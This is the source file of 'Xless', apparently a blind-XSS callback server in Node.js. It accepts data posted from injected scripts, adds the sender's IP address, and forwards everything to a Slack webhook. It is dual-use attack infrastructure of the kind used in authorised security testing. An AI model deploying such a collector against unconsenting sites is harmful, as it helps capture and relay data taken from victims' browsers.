// Xless: The Serverlesss Blind XSS App.
// Author: Mazin Ahmed <mazin@mazinahmed.net>

const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");

const port = process.env.PORT || 3000;

const app = express();
app.use(cors());
app.use(bodyParser.json());


app.use(function (req, res, next) {
  // Headers
  res.header("Powered-By", "XLESS");
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


function generate_alert(body) {
  var alert = "*XSSless: Blind XSS Alert*\n";
  for( let k of Object.keys(body)) {
    if (body[k] === "") {
      alert += "*"+k+":* " + "```None```" + "\n"
    } else {
      alert += "*"+k+":* " + "```" + body[k] + "```" + "\n"
    }
  }
  return(alert)
}


app.post("/c", (req, res) => {
    var data = req.body
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
    const alert = generate_alert(data)
    data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}

    request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
      res.send("ok\n")
      res.end()
    });
})


app.listen(port, err => {
    if (err) throw err
    console.log(`> Ready On Server http://localhost:${port}`)
})
